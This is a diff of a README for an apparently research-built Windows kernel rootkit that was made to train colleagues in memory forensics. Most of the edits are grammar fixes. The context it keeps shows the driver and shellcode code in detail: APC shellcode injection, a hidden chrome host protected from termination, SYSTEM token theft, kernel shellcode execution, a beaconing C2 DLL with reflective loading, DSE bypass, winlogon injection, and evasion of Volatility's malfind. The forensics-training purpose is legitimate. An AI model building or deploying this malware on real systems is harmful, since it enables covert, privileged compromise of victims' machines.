@@ -14,7 +14,7 @@ In addition, this repository also contain a use of Microsoft's undocumented func
   
 As a security researcher, I have encountered and analyzed various user-mode malwares in recent times. While some of them were more challenging than others, they were all designed with the same common ground in mind - **User-Mode**.  
 My colleagues and I wanted to put our forensics skills to the test in an unknown environment like the kernel space. We started by fully [reverse-engineering an APT driver](https://github.com/DanielAvinoam/BlackEnergyV2-Driver-Reverse-Engineering) from 2008 - A pretty good start, but still far from a modern day kernel-mode threat.  
-Instead of searching for a modern malicious driver to disassemble, which are extremely rare anyway, I figured it would be more beneficial to challenge my kernel programming skills and write the driver myself (After all, you should always "know your enemy")  
+Instead of searching for a modern malicious driver to disassemble, which is extremely rare anyway, I figured it would be more beneficial to challenge my kernel programming skills and write the driver myself (After all, you should always "know your enemy")  
 This driver will accompany a few other user-mode modules that together will create a complete attack vector from start to finish. The researchers will receive a [memory image](https://drive.google.com/file/d/199RgloKz4Ki6HklD5pczlNBGX-YRFd7W/view?usp=sharing) of a compromised system and will need to form an accurate status report of what happened as fast as possible.  
  
 This project's main component is its driver - meaning the rest of the user-mode modules might have some compromises and will not take every scenario into account.  
@@ -24,11 +24,11 @@ The code is written in `C++ 17` and all of its features. The user-mode component
 # The Gameplan  
   
 Before starting to write any code, the general flow of the attack should be decided.  
-When I started this project I had a vision of a user-mode process that would be able communicate with a remote server, while a driver will cover its tracks and make it look as legitimate as possible. 
-What process can be found in almost every computer today and connects to the internet regularly? **chrome.exe**.
+When I started this project I had a vision of a user-mode process that would be able communicate with a remote server while a driver will cover its tracks and make it look as legitimate as possible. 
+Which process can be found in almost every computer today and connects to the internet regularly? **chrome.exe**.
 
-So my initial plan went like this - load a driver. the driver will load a malicious library into a chrome process. this library will connect to a remote server. sounds easy, right? well, it turns out it is way more complicated than I thought.
-Loading a user-mode library from kernel space is more than just a call to `LoadLibrary`. It requires a lot of work with undocumented functions and structures, and in a such delicate environment this far from ideal - a different approach should be taken. 
+So my initial plan went like this - load a driver, the driver will load a malicious library into a chrome process, this library will connect to a remote server. sounds easy, right? well, it turns out it is way more complicated than I thought.
+Loading a user-mode library from kernel space is more than just a call to `LoadLibrary`. It requires a lot of work with undocumented functions and structures, and in a such delicate environment this is far from ideal - a different approach should be taken. 
 
 A solution driver programmers found is to execute a user-mode shellcode using an APC, similar to a malware. Many anti-virus programs work like this in order to load their DLLs into every opened process on the system.
 How can a driver know when a new process is created? The kernel provides an API of callback function registration for various events, one of them is the `PsSetCreateProcessNotifyRoutineEx` function: 
@@ -38,24 +38,24 @@ NTSTATUS PsSetCreateProcessNotifyRoutineEx(
   BOOLEAN                           Remove
 );
 ```
-The `NotifyRoutine` will be invoked whenever a new process is created. In this function the driver needs to save the PID of the created process, and capture its first thread - This can be done using another callback registration function named  `PsSetCreateThreadNotifyRoutine` that works similarly to the one prior. Before a new thread executes, it calls the `TestAlert` function, that flushes its APC queue. This guarantee us that our shellcode will be executed before the process' main thread.
-Prior to the APC queuing, the shellcode needs to be copied to an allocated region in the process' address space. This is only possible from the context of that process and since callback functions are executing by an arbitrary thread, another APC should be queued - this time a kernel one.
+The `NotifyRoutine` will be invoked whenever a new process is created. In this function the driver needs to save the PID of the created process and capture its first thread - This can be done using another callback registration function named  `PsSetCreateThreadNotifyRoutine` that works similarly to the one prior. Before a new thread executes, it calls the `TestAlert` function that flushes its APC queue. This guarantees us that our shellcode will be executed before the process' main thread.
+Prior to the APC queuing, the shellcode needs to be copied to an allocated region in the process' address space. This is only possible from the context of that process and since callback functions execute by an arbitrary thread, another APC should be queued - this time a kernel one.
 The following graph demonstrates the flow of events:
 
 ![Driver Flow](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/DriverFlow.JPG "Driver Flow")
 
-There is a crucial problem in this plan though - The malicious DLL execution is dependent on the execution of its host chrome process. We need to create a chrome process of our own and protect it from being killed. To make it look legitimate, explorer.exe's PID should be our target PID. The creation of the chrome process can be done using the same aforementioned method  (starting from an explorer.exe thread, since it is a singular process that should already run when our driver is loaded). 
-For protecting this process the kernel generously offer us another callback registration function named `ObRegisterCallbacks`, which can give us a notification before an object handle create/open/duplicate operation - All there's left for us to do is to remove the `PROCESS_TERMINATE` access from the user-returned handle.
+There is a crucial problem in this plan though - The malicious DLL execution is dependent on the execution of its host chrome process. We need to create a chrome process of our own and protect it from being terminated. To make it look legitimate, explorer.exe's PID should be our target PID. The creation of the chrome process can be done using the same aforementioned method  (starting from an explorer.exe thread, since it is a singular process that should already run when our driver is loaded). 
+For protecting this process the kernel generously offers us another callback registration function named `ObRegisterCallbacks`, which can give us a notification before an object handle create/open/duplicate operation - all there's left for us to do is to remove the `PROCESS_TERMINATE` access from the user-returned handle.
 This solution is not perfect though, According to [@zodiacon](https://github.com/zodiacon)'s Windows Kernel Programming book:
 
 > Even with this protection, clicking on a window's close button or selecting a termination option from within the application's interface would terminate the process. This is because it's being done internally by calling `ExitProcess`, Which does not involve any handles. 
 This means that the protection mechanism is essentially good for processes without user interface.
 
-This leads us to our second problem - chrome's GUI window. The suddenly-popped window will be visible to the system's user and can be closed using the window's X button. My first solution was to create the process using a `CreateProcess` function with a `CREATE_NO_WINDOW` flag sent to it. Unfortunately neither this nor using chrome's CMD arguments to hide its windows didn't work. Starting the process suspended and manipulate its memory space might work but also be loud and will defeat the whole point of having a stealthy driver in the first place. 
+This leads us to our second problem - chrome's GUI window. The suddenly-popped window will be visible to the system's user and can be closed using the window's X button. My first solution was to create the process using a `CreateProcess` function with a `CREATE_NO_WINDOW` flag sent to it. Unfortunately neither this nor using chrome's CMD arguments to hide its windows didn't work. Starting the process suspended and manipulate its memory space might work but would also be loud and will defeat the whole point of having a stealthy driver in the first place. 
 
 That's where I had an idea - what if my library's `DllMain` will never return to the caller, thus blocking the APC function and the initial call to `TestAlert`? As I suspected, this means that the initial chrome thread will not start, and the chrome window will not be created - perfect.
 
-To fully take advantage of the kernel module, It should provide its user-mode clients exclusive access to the system resources and structures. I tried to demonstrate these capabilities with it's 3 IOCTL's - changing a process' PPID, setting a process' token to the system's one and most importantly, executing a position independent kernel shellcode.
+To fully take advantage of the kernel module, it should provide its user-mode clients exclusive access to the system resources and structures. I tried to demonstrate these capabilities with it's 3 IOCTL's - changing a process' PPID, setting a process' token to the system's one and most importantly, executing a position independent kernel shellcode.
 
 ## User-Mode
 
@@ -91,7 +91,7 @@ The following diagram summarizes the complete attack flow:
 
 ## Driver 
 
-Starting from the `DriverEntry` function, the driver initializes some usual structures like a `DeviceObject` and a symbolic link, then it register its callback and dispatch functions. This is followed by the seeking of explorer's PID, which should be present in the system's process list (`FindProcessByName` simply traverse the system's `EPROCESS` list and compare each entry's name to the requested one). In case it doesn't, the thread sleeps for 5 seconds and tries again:
+Starting from the `DriverEntry` function, the driver initializes some usual structures like a `DeviceObject` and a symbolic link, then it register its callback and dispatch functions. This is followed by seeking explorer's PID, which should be present in the system's process list (`FindProcessByName` simply traverses the system's `EPROCESS` list and compares each entry's name to the requested one). In case it doesn't, the thread sleeps for 5 seconds and tries again:
 ```cpp
     // Search for explorer Process
     PEPROCESS explorerProcess;
@@ -109,7 +109,7 @@ Starting from the `DriverEntry` function, the driver initializes some usual stru
     } while (true);
     ...
 ```
- Next, an explorer thread should be caught. Using the `OnThreadNotify` callback function the driver checks whether the newly created thread is explorer's. Once found, the driver registers the `OnProcessNotify`function for process creation events and `InjectUsermodeShellcodeAPC` is then queued to that thread's APC queue, with a chrome-launching shellcode as its parameter:
+Next, an explorer thread should be caught. Using the `OnThreadNotify` callback function the driver checks whether the newly created thread is explorer's. Once found, the driver registers the `OnProcessNotify`function for process creation events and `InjectUsermodeShellcodeAPC` is then queued to that thread's APC queue, with a chrome-launching shellcode as its parameter:
 ```cpp
 // Search for an explorer Thread
 if (pid == g_Globals.ExplorerPID) 
@@ -142,7 +142,7 @@ if (pid == g_Globals.ExplorerPID)
 ...
 ```
 Notice the use of the global `RundownProtection` variable  - drivers can use run-down protection to safely access objects in shared system memory that are created and deleted by another kernel-mode driver. In our case, the variable is acquired before the queuing of an APC and it's the APC's job to release the object right before it terminates. 
-The `DriverUnload` function might get blocked by a call to `ExWaitForRundownProtectionRelease`, which will wait for the `RundownProtection` to be released (if acquired). This is how the driver guarantee that it will not be unloaded while an APC is queued for execution, thus preventing a BSOD.
+The `DriverUnload` function might get blocked by a call to `ExWaitForRundownProtectionRelease`, which will wait for the `RundownProtection` to be released (if acquired). This is how the driver guarantees that it will not be unloaded while an APC is queued for execution, thus preventing a BSOD.
 
 >**Note**: You might also noticed the lambda expression sent to the `QueueAPC` function. This is a trick to bypass the `KeInitializeApc` requirement for declaring a `PKNORMAL_ROUTINE` as the APC function and avoid casting its parameters to `PVOID` (which in some cases can cause some problems). 
 
@@ -279,7 +279,7 @@ mov edx, [rsi + rcx * 4] 	; EDX = Pointer(offset)
 add rdx, rbx 			; RDX = CreateProcessA
 mov rdi, rdx 			; Save CreateProcessA in RDI
 ```
-After `CreateProcessA`'s address is found it gets called with chrome.exe's path - this path does reside in memory because `djb2` doesn't have a decoding function (It is possible to hide this text aswell, I chose not to):
+After `CreateProcessA`'s address is found it gets called with chrome.exe's path - this path resides in memory because `djb2` doesn't have a decoding function (It is possible to hide this text aswell, I chose not to):
 ```assembly
 ; Push the rest of CreateProcessA's parameters and call it
 
@@ -299,7 +299,7 @@ add rsp, 0xD0 				; Free stack space: 0x20 (shadow space) + 0x30 (paramateres pu
 The  shellcode that loads the DLL to the chrome process works similarly to this one except calling `LoadLibrary` instead of `CreateProcessA`.
 
 ---
-Back to the driver - the shellcode gets executes by an explorer thread, causing a child chrome process to be opened. In `OnProcessNotify` the driver checks whether a new explorer child process has been created:
+Back to the driver - the shellcode gets executed by an explorer thread, causing a child chrome process to be opened. `OnProcessNotify` then checks whether a new explorer child process has been created:
 ```cpp
 void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
@@ -319,7 +319,7 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
     }
 }
 ```
-The PID of that process is saved, and its first thread is then caught by `OnThreadNotify`. Once again, a kernel APC is queued for that thread and prior to the injection of the library-loading shellcode into it, it sets the process' token to the system's one and unregister the thread and process notification callbacks:
+The PID of that process is saved, and its first thread is then caught by `OnThreadNotify`. Once again, a kernel APC is queued for that thread and prior to the injection of the library-loading shellcode into it, it sets the process' token to the system's one and unregisters the thread and process notification callbacks:
 ```cpp
     // Search for chrome's first Thread
     else if (pid == g_Globals.ChromePID)
@@ -362,8 +362,8 @@ To make my life easier, I used [@avivshabtay](https://github.com/AvivShabtay)'s 
 3. Disable all compiler code enhancement and security features (either from the project's properties or disable before the function's implementation) in order to make the assembly code as pure as possible.
 4. Write an injector that will allocate and copy the function, then call it in a new thread with the respective addresses as parameter.
 
-The IOCTL handler receives a kernel PIS in its input buffer and copies it to a new kernel allocation. In case the shellcode would need to return data, another memory space is allocated in a size also received by the client.
-The handler then initialize a `PisParameters` structure with the addresses of `MmGetSystemRoutineAddress` and the returned data allocation, and starts a new kernel thread that will execute the PIS with the address of the structure as its parameter:
+The IOCTL handler receives a kernel PIS in its input buffer and copies it to a new kernel allocation. In case the shellcode would needs to return data, another memory space is allocated in a size also received by the client.
+The handler then initializes a `PisParameters` structure with the addresses of `MmGetSystemRoutineAddress` and the returned data allocation and starts a new kernel thread that will execute the PIS with the address of the structure as its parameter:
 ```cpp
     auto* buffer = static_cast<SubZeroExecuteShellcodeData*>(Irp->AssociatedIrp.SystemBuffer);
     if (sizeof(SubZeroExecuteShellcodeData) + buffer->ShellcodeSize > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
@@ -494,7 +494,7 @@ __stdcall PisStart(PVOID StartContext)
 
 ## DLL  
 
-As mentioned earlier, in order to prevent the chrome application from start, the loaded library's `DllMain` function needs to be infinite (i.e. never return). An HTTP client object is created using [httplib](https://github.com/yhirose/cpp-httplib)'s header and a response handler function is set to be called whenever a command from the server is received. A GET request is sent to the server every 5 seconds in an endless loop and if a connection could not be established, a new object is created and the loop continues:
+As mentioned earlier, in order to prevent the chrome application from starting, the loaded library's `DllMain` function needs to be infinite (i.e. never return). An HTTP client object is created using [httplib](https://github.com/yhirose/cpp-httplib)'s header and a response handler function is set to be called whenever a command from the server is received. A GET request is sent to the server every 5 seconds in an endless loop and if a connection could not be established, a new object is created and the loop continues:
 ```cpp
 BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
 {
@@ -530,10 +530,10 @@ BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
 }
 ```
   
-  > **Note:** As you can see, the above code (and the rest of the user-mode code in this project) uses `C++ 17` features like smart pointers, exception handling and OOP excessively.
+  > **Note:** As you can see, the above code (and the rest of the user-mode code in this project) uses `C++ 17` features like smart pointers, exception handling and OOP.
  
-The client and server have opcodes that the use to communicate with - these will be set under the `'Opcode'` header in the HTTP packets. In case no command was inputted by the attacker the server sends a `KeepAlive` opcode which is answered by an empty POST packet with the same opcode.
-The 3 opcodes provided to the attacker were mentioned earlier (inject a kernel mode shellcode, reflectively load a DLL and to completely remove the malware from the system) and the result of the operation is then sent back to the server.
+The client and server have opcodes that they use to communicate with - these will be set under the `'Opcode'` header in the HTTP packets. In case no command was inputted by the attacker the server sends a `KeepAlive` opcode which is answered by an empty POST packet with the same opcode.
+The 3 other opcodes provided to the attacker were mentioned earlier (inject a kernel mode shellcode, reflectively load a DLL and to completely remove the malware from the system) and the result of the operation is then sent back to the server.
 To makes things clearer, this is how the opcodes are defined:
 ```cpp
 constexpr uint8_t KeepAliveOpcode = 0;
@@ -603,14 +603,14 @@ This class is based on [Joachim Bauch's in-memory DLL loader](https://www.joachi
  5. Execute TLS callbacks if exists.
  6. Call the library's `DllMain`.
  
-Initially, I intended to use the driver to change the DLL main allocation's `VAD` protection to `EXECUTE_WRITECOPY` and link it a `FILE_OBJECT` in order to make it look legitimate as possible. After observing a reflectively loaded library from a memory image using [Volatility Framework](https://github.com/volatilityfoundation/volatility), which is today the main tool for memory forensics (and the one my colleagues uses), it appeared it's memory regions doesn't come up on `malfind`'s results - the tool's main plugin for detecting suspicious memory allocations.
+Initially, I intended to use the driver to change the DLL main allocation's `VAD` protection to `EXECUTE_WRITECOPY` and link it a `FILE_OBJECT` in order to make it look legitimate as possible. After observing a reflectively loaded library from a memory image using [Volatility Framework](https://github.com/volatilityfoundation/volatility), which is today the main tool for memory forensics (and the one my colleagues use), it appeares it's memory regions don't come up on `malfind`'s results - the tool's main plugin for detecting suspicious memory allocations.
 This made my life much easier, since (as expected) the `VAD` structure is undocumented and manipulating it will cause a big problem source. The only thing I did was to delete the PE's header string identifiers - the "MZ" at the first 2 bytes and the DOS header error label ("This Program cannot be run in DOS mode...")
 
 The third opcode is for cleanup and will be overviewed later. 
  
 ## Loader
 
-The loader is the first file that is dropped on a new victim. It starts by changing its directory to the chrome application directory, then it extracts the driver and DLL from its resource section and saves them at the same directory. This is followed by the DSE variable overriding and the loading of the driver:
+The loader is the first file that is dropped on a new victim. It starts by changing its directory to the chrome application directory, then it extracts the driver and DLL from its resource section and saves them at the same directory. This is followed by the DSE variable overriding and the driver loading:
 ```cpp
     // Save resources to file system
     try 
@@ -746,7 +746,7 @@ public:
 ``` 
   >Because the driver protects the registry key and the chrome process, unloading it should be the first action of the cleanup process.
  
-Next, the registry key and malicious files are deleted. Here we face another problem while trying to delete some of the files. There will always be one file that cannot be deleted - the file the we're running from. This can be `eventlog_provider.dll` in case of a remote cleanup command from the server or `GoogleUpdateClient.exe` in case of a failure in the loading process. To successfully delete these files we'll need to execute code on a different process, for that we can use the aforementioned PIS injection method. The following PIS closes the process with the PID it receives after it sleeps for 3 seconds (to give the client time to send a response to the server), then it deletes both files from the file system, even if only one of them will exist: 
+Next, the registry key and malicious files are deleted. Here we face another problem while trying to delete some of the files. There will always be one file that cannot be deleted - the file that we're running from. This can be either `eventlog_provider.dll` in case of a remote cleanup command from the server or `GoogleUpdateClient.exe` in case of a failure in the loading process. To successfully delete these files we'll need to execute code on a different process, for that we can use the aforementioned PIS injection method. The following PIS closes the process with the PID it receives after it sleeps for 3 seconds (to give the client time to send a response to the server), then it deletes both files from the file system, even if only one of them will exist: 
 ```cpp
 WINAPI PisStart(struct PisParameters* pisParameters)
 {
@@ -797,7 +797,7 @@ WINAPI PisStart(struct PisParameters* pisParameters)
     return 0;
 }
 ```
-In case the file deletion operation require high privileges, The decided PIS executing process needs to have these appropriate ones and is preferred to always exist and run in the background. For that, `winlogon.exe` makes a great target - it always runs as `SYSTEM` and it is present in every windows system. In order to inject the PIS to `winlogon` the current process also needs to have `SYSTEM` privileges - that is the reason for the privilege escalation done earlier.
+In case the file deletion operation requires high privileges, the decided PIS executing process needs to have these appropriate privileges and is preferred to always exist and run in the background. For that, `winlogon.exe` makes a great target - it always runs as `SYSTEM` and it is present in every windows system. In order to inject the PIS to `winlogon` the current process also needs to have `SYSTEM` privileges - that is the reason for the privilege escalation done earlier.
 If the escalation fails (either because the driver isn't loaded or because of an error in the `DeviceIOControl` call) the process creates a new `cmd` process and sets it as the injection target process.
 The cleanup process finishes by injecting the PIS and throwing an exception log in case of an error:
 ```cpp
